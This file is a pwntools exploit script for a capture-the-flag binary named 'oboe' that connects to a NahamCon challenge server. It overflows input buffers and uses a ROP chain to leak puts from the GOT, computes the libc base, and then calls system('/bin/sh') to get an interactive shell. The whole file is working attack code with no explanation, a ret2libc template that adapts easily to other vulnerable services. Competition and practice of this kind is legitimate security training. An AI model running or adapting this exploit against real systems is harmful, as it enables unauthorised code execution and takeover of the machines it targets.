#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./oboe_patched"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("challenge.nahamcon.com", 30557)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *build+358
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


# leak libc address
# for searching remote libc version <- 2.27-3ubuntu1.6

payload = b"A" * 64

p.recvuntil(":")
p.sendline(payload)

payload = b"B" * 64

p.recvuntil(":")
p.sendline(payload)
rop_ret = 0x08048a13
rop_add_esp_8_pop_ebx_ret = 0x08048803

payload = p32(rop_ret) * 3
payload += p32(elf.plt["puts"])
payload += p32(elf.symbols["build"])
payload += p32(elf.got["puts"])
payload += p32(0xdeadbeef) * 2

p.recvuntil(":")
p.sendline(payload)

p.recvuntil(payload + b'\n')

puts_libc_addr = u32(p.recv(4))
log.info("puts@libc: " + hex(puts_libc_addr))
"""
__libc_start_main = u32(p.recv(4))
log.info("__libc_start_main: " + hex(__libc_start_main))
memset_libc_addr = u32(p.recv(4))
log.info("memset@libc: " + hex(memset_libc_addr))
"""
libc_base = puts_libc_addr - libc.symbols["puts"]
libc.address = libc_base
log.info("libc base: " + hex(libc_base))

# execute system("/bin/sh")
payload = b"A" * 64

p.recvuntil(":")
p.sendline(payload)

payload = b"B" * 64

p.recvuntil(":")
p.sendline(payload)

payload = p32(rop_ret) * 3
payload += p32(libc.symbols["system"])
payload += p32(elf.symbols["build"])
payload += p32(next(libc.search(b"/bin/sh\0")))
payload += p32(0xdeadbeef) * 2

p.recvuntil(":")
p.sendline(payload)


p.interactive()
